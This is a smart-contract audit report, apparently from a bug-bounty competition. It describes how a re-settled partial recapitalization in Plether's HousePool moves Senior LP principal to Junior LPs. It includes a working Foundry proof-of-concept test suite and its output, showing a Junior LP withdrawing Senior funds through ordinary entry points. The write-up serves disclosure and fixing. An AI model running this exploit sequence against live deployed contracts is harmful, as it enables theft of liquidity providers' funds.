# \#99783 [SC-High] Leftover of a partly settled recapitalization is re-settled against Senior's own principal, letting Junior LPs withdraw Senior funds

**Submitted on Nov 15th 2026 at 08:32:34 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99783
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

When the owner tops up a pool that still owes traders money, only part of the top-up can be booked. `HousePool` credits Senior with the part it can afford and keeps the rest queued. On the next reconcile it measures that queue against the whole pool equity, which by then is exactly what Senior was just credited. Senior's balance is written off as a loss, the pool is re-booked from zero with a smaller Senior recovery mark, and the difference is credited to Junior.

Nothing has to change between the two reconciles: no cash, no claim and no price moves. Anyone can trigger the second one through `settleLpEpoch`, and a Junior LP can then redeem USDC that was Senior principal one settlement earlier.

## Description

I use the numbers from the repo's own test, `HousePoolSnapshotParityTest.test_PartialMixedInflowsPreserveFullIntentAndSettleResidualLater`. A 40,000 recapitalization and 15,000 of queued revenue arrive while traders are owed 30,000, so the pool's real equity is 25,000.

**Reconcile #1 (correct, and what the repo test asserts)**

Senior is credited 25,000 and its high-water mark is set to 40,000. The other 15,000 of recapitalization and the 15,000 of revenue stay queued.

**Reconcile #2 (nothing changed in between)**

1. `_settleablePendingClaimantBuckets` (`HousePool.sol:1829-1834`) caps the queue with `capClaimantBuckets` (`HousePoolPendingPreviewLib.sol:72-82`) against the whole distributable equity. That is 25,000, so 25,000 of the queue (15,000 recapitalization and 10,000 revenue) is treated as affordable, even though that 25,000 is the capital Senior already owns.
2. `planReconcile` sets that amount aside before it compares equity with principal (`HousePoolReconcilePlanLib.sol:68-71`). Nothing is left to back Senior's 25,000, so it books a 25,000 loss (`:102-104`).
3. `applyClaimantRecapitalizationIntent` now sees zero principal and takes its bootstrap branch (`HousePoolPendingPreviewLib.sol:117-122`). Senior gets the leftover 15,000 and its high-water mark is overwritten with 15,000. Senior now looks fully restored, so the 10,000 of revenue goes to Junior.

Result: Senior 25,000 → 15,000, Junior 0 → 10,000, Senior's mark 40,000 → 15,000.

**It does not heal later**

Because the mark was cut, value that comes back afterwards goes to Junior. When equity recovers to 55,000 (the same continuation the repo test uses), the pool ends at Senior 15,000 and Junior 40,000. The repo test expects Senior 40,000 and Junior 15,000 from the same inputs.

**Queued revenue is not needed**

Take only a 40,000 top-up into a pool that owes traders 30,000 more than it holds. Each extra reconcile cuts Senior's mark by another 10,000 (40,000 → 30,000 → 20,000 → 10,000). After recovery Senior holds 10,000 and Junior 30,000. With a single reconcile before the recovery, Senior gets the full 40,000 and Junior gets nothing. The same happens when the loss was never reconciled before the top-up.

**How it is reached**

- The owner follows the runbook for a pool in deficit: `recapitalizePool`, then `clearDegradedMode` (`packages/perps/SECURITY.md:1509-1511`). Both are legitimate, documented actions.
- `settleLpEpoch` stores a reconcile, and anyone can call it when no positions are open or the oracle is frozen. A Junior holder only needs a redemption request in the queue. While Junior is worth zero the request is handed back as shares, which still counts as epoch progress, so he simply asks again for the next epoch.
- It only needs that no redemption with real value is stuck at the head of the queue.

**Why this is not a duplicate**

SC-L1 from the pre-audit (fixed in plether-core#29) added the cap, and the response says the unsettled part "gets applied later once it's backed". Cecuro MED-12 (fixed in `f852f96`) repeats that partial-settlement residuals stay reserved. Here the residual is applied on the next pass although nothing new backs it, because the cap is measured against equity that the first pass already gave to Senior. The repo test checks the first pass and then jumps straight to full recovery, so a second pass during the deficit is never exercised.

## Impact

Direct theft of user funds (Senior LP principal).

- Senior principal moves to Junior with no market loss behind it, and a Junior LP can cash it out. In the PoC the Senior LP's share of stored principal falls from 24,509.80 to 14,705.88 USDC in one settlement, and the Junior LP receives 9,803.92 USDC. Under the deployed limits (80% senior share) 6,250 USDC leaves in that same call and the other 3,750 stays as Junior principal.
- The loss is permanent. Senior's recovery mark is cut from 40,000 to 15,000, so later recovery goes to Junior. Senior ends 25,000 short of what the protocol's own test says it should hold.
- The attacker needs no privilege, only Junior shares and two settlements. The amount grows with the size of the top-up and of the deficit.

Conditions, stated plainly: the pool must be in deficit when the owner recapitalizes, so the top-up is only partly backed. Degraded mode must be cleared, and two settlements must land before equity recovers. That is the situation `recapitalizePool` and the runbook exist for.



## Proof of Concept

## Proof of Concept


A Foundry test for the in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It adds one test file and changes no source file.

### How to run

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive

# save the test file below as:
#   packages/perps/test/perps/poc/PartialRecapResettlePoC.t.sol

forge test --root packages/perps --match-path 'test/perps/poc/PartialRecapResettlePoC.t.sol' -vv
```

All 5 tests pass with Foundry v1.5.1 and Solidity 0.8.35, the versions the repository's CI uses.

### What the tests show

- `test_PoC_secondReconcileMovesSeniorPrincipalToJunior`: the repo fixture plus one more reconcile. Senior 25,000 and Junior 0 become Senior 15,000 and Junior 10,000 with no cash, claim or price change. After recovery the pool ends at 15,000 and 40,000 instead of 40,000 and 15,000.
- `test_PoC_withoutQueuedRevenue_eachReconcileCutsSeniorTarget` and `test_PoC_withoutQueuedRevenue_noPriorWipeNeeded`: the top-up-only case. Senior's mark drops 40,000 → 10,000, and the pool ends at Senior 10,000 and Junior 30,000. The control with one reconcile ends at 40,000 and 0.
- `test_PoC_liveFlow_juniorLpWithdrawsSeniorPrincipal`: the owner recapitalizes and clears degraded mode. After that only `settleLpEpoch` from an unrelated address and ordinary vault calls are used. The Junior LP receives 9,803.92 USDC.
- The same live-flow test under the deployed senior limits (80% share, 40M cap): 6,250 USDC leaves at once.

### How the state is built

- The deficit is built the way the protocol's own test for this path builds it: pool cash is burned and the wipe is reconciled, and the trader-claim total is written to engine storage.
- The live-flow tests also set the degraded-mode flag, so they can follow the runbook steps.
- From the recapitalization on, the live-flow tests use production entry points only: `CfdEngine.recapitalizePool`, `CfdEngine.clearDegradedMode`, `TrancheVault.requestRedeem`, `TrancheVault.claimRedeemRefund`, `TrancheVault.claimRedeem` and `HousePool.settleLpEpoch`.

### Test file

`packages/perps/test/perps/poc/PartialRecapResettlePoC.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {StdStorage, stdStorage} from "forge-std/StdStorage.sol";

// PoC: a partly settled recapitalization is settled again on the next reconcile.
//
// Place at:  packages/perps/test/perps/poc/PartialRecapResettlePoC.t.sol   (commit a82d4fef)
// Run with:  forge test --root packages/perps --match-path 'test/perps/poc/PartialRecapResettlePoC.t.sol' -vv
//
//   1. PartialRecapResettleFixturePoC
//        The repository's own fixture (HousePoolSnapshotParityTest
//        .test_PartialMixedInflowsPreserveFullIntentAndSettleResidualLater) with one extra reconcile.
//        Also shows the variant that needs no queued revenue and no prior stored wipe.
//   2. PartialRecapResettleLiveFlowPoC
//        Same pre-state, then production entry points only: CfdEngine.recapitalizePool (owner, runbook),
//        CfdEngine.clearDegradedMode (owner, runbook), HousePool.settleLpEpoch (anyone), TrancheVault redeem (LP).
//        A junior LP ends up holding USDC that was stored Senior principal one settlement earlier.
//   3. PartialRecapResettleLiveFlowDeployedCovenantPoC
//        Test 2 again under the senior limits of the checked-in Arbitrum Sepolia manifests (80% / 40M).

abstract contract PartialRecapResettleBase is BasePerpTest {

    using stdStorage for StdStorage;

    function _recordInflow(
        IHousePool.ClaimantInflowKind kind,
        uint256 amount
    ) internal {
        settlementToken.mint(address(pool), amount);
        vm.prank(address(engine));
        pool.recordClaimantInflow(amount, kind, IHousePool.ClaimantInflowCashMode.CashArrived);
    }

    function _reconcile() internal {
        vm.prank(address(juniorVault));
        pool.reconcile();
    }

    /// @dev Same helper as HousePoolSnapshotParityTest._wipePrincipal().
    function _wipePrincipal() internal {
        settlementToken.burn(address(pool), pool.totalAssets());
        _reconcile();
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(seniorVault.totalSupply(), 0, "senior ownership survives the wipe");
        assertGt(juniorVault.totalSupply(), 0, "junior ownership survives the wipe");
    }

    function _setTraderClaims(
        uint256 amount
    ) internal {
        stdstore.target(address(engine)).sig("totalTraderClaimBalanceAssets()").checked_write(amount);
    }

    function _ownerRecapitalizes(
        uint256 amount
    ) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
    }

    function _log(
        string memory label
    ) internal {
        emit log_string(label);
        emit log_named_decimal_uint("  seniorPrincipal        ", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("  juniorPrincipal        ", pool.juniorPrincipal(), 6);
        emit log_named_decimal_uint("  seniorHighWaterMark    ", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("  pendingRecapitalization", pool.pendingRecapitalizationAssets(), 6);
        emit log_named_decimal_uint("  pendingTradingRevenue  ", pool.pendingTradingRevenueAssets(), 6);
        emit log_named_decimal_uint("  pool cash              ", settlementToken.balanceOf(address(pool)), 6);
        emit log_named_decimal_uint("  trader claims          ", engine.totalTraderClaimBalanceAssets(), 6);
    }

}

contract PartialRecapResettleFixturePoC is PartialRecapResettleBase {

    /// Recapitalization 40,000 + 15,000 revenue queued during the wipe, traders owed 30,000 (the repo fixture).
    function test_PoC_secondReconcileMovesSeniorPrincipalToJunior() public {
        // ---- identical to the repository test ----
        _wipePrincipal();
        _recordInflow(IHousePool.ClaimantInflowKind.Recapitalization, 40_000e6);
        _recordInflow(IHousePool.ClaimantInflowKind.Revenue, 15_000e6);
        _setTraderClaims(30_000e6);

        // ---- reconcile #1: exactly what the repository test asserts ----
        _reconcile();
        _log("after reconcile #1 (the result the repo test asserts)");
        assertEq(pool.seniorPrincipal(), 25_000e6);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.seniorHighWaterMark(), 40_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 15_000e6);
        assertEq(pool.pendingTradingRevenueAssets(), 15_000e6);

        // The vault share previews already price in the next pass.
        assertEq(seniorVault.totalAssets(), 15_000e6, "senior vault already reports 15,000");
        assertEq(juniorVault.totalAssets(), 10_000e6, "junior vault already reports 10,000");

        // ---- reconcile #2: same block, no cash moved, no claim moved, no price moved ----
        uint256 cashBefore = settlementToken.balanceOf(address(pool));
        uint256 claimsBefore = engine.totalTraderClaimBalanceAssets();
        _reconcile();
        _log("after reconcile #2 (nothing changed in between)");
        assertEq(settlementToken.balanceOf(address(pool)), cashBefore, "no cash moved");
        assertEq(engine.totalTraderClaimBalanceAssets(), claimsBefore, "no claim moved");

        assertEq(pool.seniorPrincipal(), 15_000e6, "senior lost 10,000 of stored principal");
        assertEq(pool.juniorPrincipal(), 10_000e6, "junior received it");
        assertEq(pool.seniorHighWaterMark(), 15_000e6, "senior recovery target cut from 40,000");
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.pendingTradingRevenueAssets(), 5000e6);

        // ---- reconcile #3: the last 5,000 clears, the split is final ----
        _reconcile();
        assertEq(pool.seniorPrincipal(), 15_000e6);
        assertEq(pool.juniorPrincipal(), 10_000e6);
        assertEq(pool.pendingTradingRevenueAssets(), 0);

        // ---- same continuation as the repository test: equity recovers to 55,000 ----
        _setTraderClaims(0);
        _reconcile();
        _log("after equity recovers to 55,000 (repo test: senior 40,000 / junior 15,000)");
        assertEq(pool.seniorPrincipal(), 15_000e6, "senior ends 25,000 short of the repo-test outcome");
        assertEq(pool.juniorPrincipal(), 40_000e6, "junior ends 25,000 ahead of the repo-test outcome");
    }

    /// No queued revenue at all: recapitalize 40,000 into a 30,000 deficit. Every further reconcile cuts Senior's
    /// recovery target by 10,000 and shrinks the queue by 10,000 although nothing became backed.
    function test_PoC_withoutQueuedRevenue_eachReconcileCutsSeniorTarget() public {
        _wipePrincipal();
        _runWithoutQueuedRevenue();
    }

    /// Same, but the loss was never reconciled before the recapitalization: stored principal is still the
    /// pre-loss value when the owner recapitalizes. No stored wipe is needed either.
    function test_PoC_withoutQueuedRevenue_noPriorWipeNeeded() public {
        assertGt(pool.seniorPrincipal() + pool.juniorPrincipal(), 1_000_000e6, "pre-loss principal still stored");
        settlementToken.burn(address(pool), pool.totalAssets());
        _runWithoutQueuedRevenue();
    }

    function _runWithoutQueuedRevenue() internal {
        _setTraderClaims(30_000e6);
        _ownerRecapitalizes(40_000e6);

        _reconcile();
        assertEq(pool.seniorPrincipal(), 10_000e6);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.seniorHighWaterMark(), 40_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 30_000e6);

        uint256 snapshot = vm.snapshotState();

        // Control: one reconcile only, then equity recovers -> the whole 40,000 restores Senior.
        _setTraderClaims(0);
        _reconcile();
        assertEq(pool.seniorPrincipal(), 40_000e6, "control: senior fully restored");
        assertEq(pool.juniorPrincipal(), 0, "control: junior gets nothing");

        // Same state, but reconcile runs three more times before the recovery.
        assertTrue(vm.revertToState(snapshot));
        _reconcile();
        assertEq(pool.seniorHighWaterMark(), 30_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 20_000e6);
        _reconcile();
        assertEq(pool.seniorHighWaterMark(), 20_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 10_000e6);
        _reconcile();
        assertEq(pool.seniorHighWaterMark(), 10_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.seniorPrincipal(), 10_000e6);

        _setTraderClaims(0);
        _reconcile();
        _log("no queued revenue, 4 reconciles, then equity recovers to 40,000");
        assertEq(pool.seniorPrincipal(), 10_000e6, "senior stays at 10,000");
        assertEq(pool.juniorPrincipal(), 30_000e6, "junior takes the 30,000 that should restore senior");
    }

}

contract PartialRecapResettleLiveFlowPoC is PartialRecapResettleBase {

    using stdStorage for StdStorage;

    address internal seniorLp = makeAddr("seniorLp");
    address internal juniorLp = makeAddr("juniorLp");
    address internal anyone = makeAddr("anyone");

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev juniorLp owns 50,000 / 51,000 of Junior. The default test covenant (99.99%) lets its whole share out.
    function _expectedJuniorPayout() internal pure virtual returns (uint256 lower, uint256 upper) {
        return (9800e6, 9810e6);
    }

    function _requestRedeemAll() internal returns (uint256 requestId) {
        uint256 shares = juniorVault.maxRequestRedeem(juniorLp);
        vm.prank(juniorLp);
        requestId = juniorVault.requestRedeem(shares, juniorLp, juniorLp);
    }

    function _seniorLpValue() internal view returns (uint256) {
        uint256 supply = seniorVault.totalSupply();
        return supply == 0 ? 0 : pool.seniorPrincipal() * seniorVault.balanceOf(seniorLp) / supply;
    }

    function test_PoC_liveFlow_juniorLpWithdrawsSeniorPrincipal() public {
        // Ordinary LPs on top of the two 1,000 seed positions.
        _fundJunior(juniorLp, 50_000e6);
        _fundSenior(seniorLp, 50_000e6);

        // ------------------------------------------------------------------
        // Pre-state, built like the repository fixture
        // ------------------------------------------------------------------
        _wipePrincipal();
        // 15,000 of trading revenue arrives while stored principal is zero -> queued (HousePool.sol:644-648).
        _recordInflow(IHousePool.ClaimantInflowKind.Revenue, 15_000e6);
        // Traders are owed 30,000 that the pool cannot pay.
        _setTraderClaims(30_000e6);
        // If the deficit latched degraded mode, LP settlement stays blocked until the owner clears it.
        // Modelled here so the test follows runbook steps 4 and 5 and the bug is shown to survive both.
        stdstore.target(address(engine)).sig("degradedMode()").checked_write(true);

        // ------------------------------------------------------------------
        // From here on: production entry points only
        // ------------------------------------------------------------------
        // Runbook step 4 (packages/perps/SECURITY.md:1509): the owner recapitalizes 40,000.
        _ownerRecapitalizes(40_000e6);
        // Runbook step 5 (:1510): raw solvency is restored, so the owner clears degraded mode.
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode());
        assertEq(settlementToken.balanceOf(address(pool)), 55_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 40_000e6);
        assertEq(pool.pendingTradingRevenueAssets(), 15_000e6);

        // A junior LP asks to leave. Junior is worth zero right now, so the request has to be for its full balance.
        vm.warp(vm.getBlockTimestamp() + 1 hours); // deposit cooldown
        uint256 firstRequest = _requestRedeemAll();
        vm.warp(pool.lpEpochStart(firstRequest));

        // --- settlement #1, called by anyone -> reconcile #1, the documented partial settlement ---
        vm.prank(anyone);
        pool.settleLpEpoch(0, 0);
        _log("after settleLpEpoch #1");
        emit log_named_decimal_uint("  seniorLp share of stored principal", _seniorLpValue(), 6);
        assertEq(pool.seniorPrincipal(), 25_000e6);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.seniorHighWaterMark(), 40_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 15_000e6);
        assertEq(pool.pendingTradingRevenueAssets(), 15_000e6);
        // Junior principal is zero, so the junior request is worth nothing and is handed back as shares.
        assertGt(juniorVault.refundableRedeemRequest(firstRequest, juniorLp), 0);
        assertEq(settlementToken.balanceOf(juniorLp), 0);

        // The junior LP takes the shares back and simply asks again.
        vm.prank(juniorLp);
        juniorVault.claimRedeemRefund(firstRequest, juniorLp, juniorLp);
        vm.warp(vm.getBlockTimestamp() + 1 hours); // cooldown after the refund
        uint256 secondRequest = _requestRedeemAll();
        vm.warp(pool.lpEpochStart(secondRequest));

        assertEq(settlementToken.balanceOf(address(pool)), 55_000e6, "no cash moved since settlement #1");
        assertEq(engine.totalTraderClaimBalanceAssets(), 30_000e6, "no claim moved since settlement #1");

        // --- settlement #2, called by anyone -> reconcile #2 moves Senior principal to Junior and pays it out ---
        vm.prank(anyone);
        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
        _log("after settleLpEpoch #2 (only time has passed)");
        emit log_named_decimal_uint("  seniorLp share of stored principal", _seniorLpValue(), 6);
        emit log_named_decimal_uint("  junior redemption funded in this call", result.juniorFundedAssets, 6);

        assertEq(pool.seniorPrincipal(), 15_000e6, "senior lost 10,000 of stored principal");
        assertEq(pool.seniorHighWaterMark(), 15_000e6, "senior recovery target cut from 40,000");
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.pendingTradingRevenueAssets(), 5000e6);
        assertEq(pool.juniorPrincipal() + result.juniorFundedAssets, 10_000e6, "junior was credited 10,000");

        // The junior LP collects real USDC.
        uint256 claimableShares = juniorVault.claimableRedeemRequest(secondRequest, juniorLp);
        vm.prank(juniorLp);
        uint256 paid = juniorVault.claimRedeem(secondRequest, claimableShares, juniorLp, juniorLp);
        emit log_named_decimal_uint("USDC received by the junior LP", paid, 6);

        (uint256 lower, uint256 upper) = _expectedJuniorPayout();
        assertGe(paid, lower);
        assertLe(paid, upper);
        assertEq(paid, result.juniorFundedAssets);
        assertEq(settlementToken.balanceOf(juniorLp), paid);
        assertEq(settlementToken.balanceOf(address(pool)), 55_000e6 - paid, "the cash left the pool");
    }

}

contract PartialRecapResettleLiveFlowDeployedCovenantPoC is PartialRecapResettleLiveFlowPoC {

    /// @dev deployments/releases/*/manifest.json: maxSeniorShareBps 8000, maxSeniorExposure 40,000,000.
    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorShareBps = 8000;
        config.maxSeniorExposureAssets = 40_000_000e6;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        vm.warp(SETUP_TIMESTAMP);
    }

    /// @dev Junior must keep 15,000 * 20 / 80 = 3,750 behind Senior, so 6,250 of the 10,000 leaves immediately.
    function _expectedJuniorPayout() internal pure override returns (uint256 lower, uint256 upper) {
        return (6250e6, 6250e6);
    }

}
```

### Output

Shortened where marked with `...`; the two main tests are shown in full.

```text
Ran 3 tests for test/perps/poc/PartialRecapResettlePoC.t.sol:PartialRecapResettleFixturePoC
[PASS] test_PoC_secondReconcileMovesSeniorPrincipalToJunior() (gas: 777758)
Logs:
  after reconcile #1 (the result the repo test asserts)
    seniorPrincipal        : 25000.000000
    juniorPrincipal        : 0.000000
    seniorHighWaterMark    : 40000.000000
    pendingRecapitalization: 15000.000000
    pendingTradingRevenue  : 15000.000000
    pool cash              : 55000.000000
    trader claims          : 30000.000000
  after reconcile #2 (nothing changed in between)
    seniorPrincipal        : 15000.000000
    juniorPrincipal        : 10000.000000
    seniorHighWaterMark    : 15000.000000
    pendingRecapitalization: 0.000000
    pendingTradingRevenue  : 5000.000000
    pool cash              : 55000.000000
    trader claims          : 30000.000000
  after equity recovers to 55,000 (repo test: senior 40,000 / junior 15,000)
    seniorPrincipal        : 15000.000000
    juniorPrincipal        : 40000.000000
    seniorHighWaterMark    : 15000.000000
    pendingRecapitalization: 0.000000
    pendingTradingRevenue  : 0.000000
    pool cash              : 55000.000000
    trader claims          : 0.000000
[PASS] test_PoC_withoutQueuedRevenue_eachReconcileCutsSeniorTarget() (gas: 723362)
  ...
[PASS] test_PoC_withoutQueuedRevenue_noPriorWipeNeeded() (gas: 685039)
  ...
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 17.61ms (6.27ms CPU time)
Ran 1 test for test/perps/poc/PartialRecapResettlePoC.t.sol:PartialRecapResettleLiveFlowPoC
[PASS] test_PoC_liveFlow_juniorLpWithdrawsSeniorPrincipal() (gas: 3182580)
Logs:
  after settleLpEpoch #1
    seniorPrincipal        : 25000.000000
    juniorPrincipal        : 0.000000
    seniorHighWaterMark    : 40000.000000
    pendingRecapitalization: 15000.000000
    pendingTradingRevenue  : 15000.000000
    pool cash              : 55000.000000
    trader claims          : 30000.000000
    seniorLp share of stored principal: 24509.795144
  after settleLpEpoch #2 (only time has passed)
    seniorPrincipal        : 15000.000000
    juniorPrincipal        : 196.076676
    seniorHighWaterMark    : 15000.000000
    pendingRecapitalization: 0.000000
    pendingTradingRevenue  : 5000.000000
    pool cash              : 45196.076676
    trader claims          : 30000.000000
    seniorLp share of stored principal: 14705.877086
    junior redemption funded in this call: 9803.923324
  USDC received by the junior LP: 9803.923324
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.08ms (3.58ms CPU time)
Ran 1 test for test/perps/poc/PartialRecapResettlePoC.t.sol:PartialRecapResettleLiveFlowDeployedCovenantPoC
[PASS] test_PoC_liveFlow_juniorLpWithdrawsSeniorPrincipal() (gas: 3155901)
  ...
    junior redemption funded in this call: 6250.000000
  USDC received by the junior LP: 6250.000000
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.29ms (4.68ms CPU time)
Ran 3 test suites in 26.69ms (38.97ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
```
